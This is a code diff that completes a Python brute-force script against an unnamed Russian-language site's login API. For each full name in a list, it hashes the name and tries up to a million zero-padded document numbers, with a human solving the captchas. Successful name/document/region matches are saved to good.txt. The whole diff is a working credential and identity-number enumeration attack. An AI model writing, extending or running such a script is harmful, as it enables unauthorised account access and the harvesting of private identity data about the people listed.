@@ -50,7 +50,7 @@ def solve_captcha():
         print("Open captcha to solve")
         print("Enter code: ")
         os.system("start " + "image.jpg")
-        captcha = int(input())
+        captcha = input().strip()
 
         status = requests.post(base_path + api["login"], data={
             "Captcha": captcha,
@@ -67,7 +67,7 @@ def solve_captcha():
             print("Error! Captcha isnt solved")
             print("Try to get new captcha")
 
-        print("Captcha solved!")
+    print("Captcha solved!")
 
 
 def send_request(code, document, hash, region):
@@ -78,40 +78,76 @@ def send_request(code, document, hash, region):
             "Hash": hash,
             "Region": region,
             "Token": token
-        }).text
-    return r
+        })
+    return r.text, r.status_code
+
+
+def get_hash(fullname):
+    return hashlib.md5(fullname.lower().strip().replace(" ", "").replace("й", "и").encode("utf-8")).hexdigest()
+
+
+def save_good(fullname, document, region):
+    with open("good.txt", "a", encoding="utf-8") as file:
+        file.write(fullname + " " + str(region) + " " + str(document) + "\n")
+
 
 get_regions()
-
 solve_captcha()
-while True:
-    solved = True
 
-    # Pickup FullName
+with open("fios.txt", "r", encoding="utf-8") as file:
+    fios = file.read().split("\n")
+
+for fullname in fios:
+
+    # Get hash
+    hash = get_hash(fullname)
+    print("Generate hash: " + str(hash) + " for FIO: " + fullname)
+
+    # Code is an empty string
     code = ""
-    document = ""
-    hash = ""
-    region = ""
 
-    # Post it to site
-    while not solved:
+    # Pickup region
+    region = 61
 
-        solved = True
+    found = False
 
-        result = send_request(code, document, hash, region)
-        result_code = result.result_code
+    # Pickup document
+    for document in range(0, 1000000):
 
-        # Check result
-        if result_code == 204:
-            print("Great job! Login success")
-            print("Saving it to file")
-            #save_good()
-        elif result.text == '"Участник не найден"':
-            print("Login failed. Trying next one")
-        elif result.text == '"Пожалуйста, проверьте правильность введённого кода с картинки"':
-            # Captcha die
+        if found:
+            break
+
+        solved = False
+        found = False
+
+        # Post it to site
+        while not solved:
+
+            document = str(document)
+            while len(document) < 10:
+                document = "0" + document
+
             solved = False
-            print("Captcha die, trying to get new one")
-            solve_captcha()
 
-    break
+            print("Sending request with hash: " + str(hash) + " doc: " + str(document) + " captcha_code: " + str(captcha))
+
+            result, result_code = send_request(code, document, hash, region)
+
+            print("Get server answer, code: " + str(result_code) + " Answer: " + result)
+
+            # Check result
+            if result_code == 204:
+                print("Great job! Login success")
+                print("Saving it to file")
+                save_good(fullname, document, region)
+                solved = True
+                found = True
+            elif result == '"Участник не найден"':
+                print("Login failed. Trying next one")
+                solved = True
+            elif result == '"Пожалуйста, проверьте правильность введённого кода с картинки"':
+                # Captcha die
+                print("Captcha die, trying to get new one")
+                solve_captcha()
+
+print("Well done. Check good.txt")
